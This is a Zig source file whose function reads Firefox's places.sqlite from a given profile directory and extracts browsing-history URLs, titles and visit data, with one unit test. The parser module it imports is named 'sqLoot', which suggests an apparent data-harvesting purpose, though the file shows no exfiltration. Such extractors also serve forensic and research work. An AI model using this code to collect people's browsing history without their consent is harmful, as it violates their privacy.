const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const sqLoot = @import("../parsers/sqLoot.zig");

pub const HistoryEntry = struct {
    title: []const u8,
    url: []const u8,
    visit_count: i64,
    last_visit_date: i64,
};

pub fn extractHistory(allocator: std.mem.Allocator, profile_dir: []const u8, out: *std.ArrayList(HistoryEntry)) void {
    var path_buf: [512]u8 = undefined;
    const db_path = std.fmt.bufPrint(&path_buf, "{s}\\places.sqlite", .{profile_dir}) catch return;

    const mapped = file_io.MappedFile.open(db_path) orelse return;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return;
    defer db.deinit();

    const rows = db.readTable("moz_places") catch return;
    defer {
        for (rows) |r| allocator.free(r);
        allocator.free(rows);
    }

    for (rows) |row| {
        if (row.len < 4) continue;
        const url = if (row[0] == .text) row[0].text else continue;
        const title = if (row[1] == .text) row[1].text else "";
        const visit_count = if (row[2] == .int) row[2].int else continue;
        const last_visit = if (row[3] == .int) row[3].int else 0;

        const t = allocator.dupe(u8, title) catch break;
        const u = allocator.dupe(u8, url) catch break;
        out.append(.{ .title = t, .url = u, .visit_count = visit_count, .last_visit_date = last_visit }) catch break;
    }
}

test "extractHistory file not found returns empty" {
    var list = std.ArrayList(HistoryEntry).init(std.testing.allocator);
    defer {
        for (list.items) |h| {
            std.testing.allocator.free(h.title);
            std.testing.allocator.free(h.url);
        }
        list.deinit();
    }
    extractHistory(std.testing.allocator, "C:\\nonexistent", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
